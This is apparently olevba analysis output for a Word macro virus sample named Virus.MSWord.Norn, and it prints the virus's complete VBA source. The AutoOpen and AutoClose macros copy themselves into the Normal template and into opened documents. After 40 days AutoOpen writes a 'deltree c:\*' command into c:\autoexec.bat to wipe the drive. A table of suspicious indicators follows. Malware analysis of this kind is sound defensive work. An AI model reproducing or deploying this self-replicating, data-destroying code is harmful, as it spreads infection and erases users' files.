olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Norn-99143e10d2ddaa7194c3849c038fc249b7a43eb3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Norn-99143e10d2ddaa7194c3849c038fc249b7a43eb3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Norn-99143e10d2ddaa7194c3849c038fc249b7a43eb3 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
Dim n$
Dim m$
Dim a$
Dim t$
Dim o$
Dim c$
'ver. 6.0520.24
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo quit
WordBasic.CurValues.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
n$ = WordBasic.[FileName$]()
m$ = WordBasic.[DefaultDir$](2) + "\norm"
a$ = ":Auto"
t$ = m$ + "al"
o$ = a$ + "Open"
c$ = a$ + "Close"
WordBasic.MacroCopy t$ + o$, (n$ + o$), 1
WordBasic.MacroCopy t$ + c$, (n$ + c$), 1
WordBasic.FileSaveAs dlg
GoTo done
quit:
If Err.Number <> 102 Then WordBasic.FileSaveAs dlg
WordBasic.MsgBox Str(Err.Number), -2
done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Norn-99143e10d2ddaa7194c3849c038fc249b7a43eb3 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "F%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim name_$
Dim ver
Dim n$
Dim m$
Dim a$
Dim t$
Dim o$
Dim c$
Dim w$
Dim m_
Dim c_
Dim o_
Dim t2$
'ver. 6.059.27
name_$ = "Gest"
ver = 2
n$ = WordBasic.[FileName$]()
m$ = WordBasic.[DefaultDir$](2) + "\norm"
a$ = "Auto"
t$ = m$ + "al"
o$ = ":" + a$ + "Open"
c$ = ":" + a$ + "Close"
w$ = "win.ini"
On Error GoTo -1: On Error GoTo quit
For m_ = 1 To WordBasic.CountMacros(0, 0)
c_ = -(WordBasic.[MacroName$](m_, 0, 0) = c$)
o_ = -(WordBasic.[MacroName$](m_, 0, 0) = o$)
Next m_
If WordBasic.Val(WordBasic.[GetPrivateProfileString$](name_$, a$, w$)) > ver Then
WordBasic.MacroCopy t$ + o$, (n$ + o$)
WordBasic.MacroCopy t$ + c$, (t2$ + c$)
ElseIf Not c_ And Not o_ Then
WordBasic.MacroCopy n$ + o$, (t$ + o$)
WordBasic.MacroCopy n$ + c$, (t$ + c$)
WordBasic.SetPrivateProfileString name_$, a$, Str(ver), w$
WordBasic.SetPrivateProfileString name_$, "date", Str(WordBasic.Today()), w$
End If
If WordBasic.Val(WordBasic.[GetPrivateProfileString$](name_$, "date", w$)) + 40 < WordBasic.Today() Then
WordBasic.FileOpen Name:="c:\" + a$ + "exec.bat", AddToMru:=0
WordBasic.StartOfDocument
WordBasic.Insert "@deltree c:\*>nul"
WordBasic.InsertPara
WordBasic.DocClose 1
End If
quit:
WordBasic.ToolsOptionsSave GlobalDotPrompt:=1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |exec.bat            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

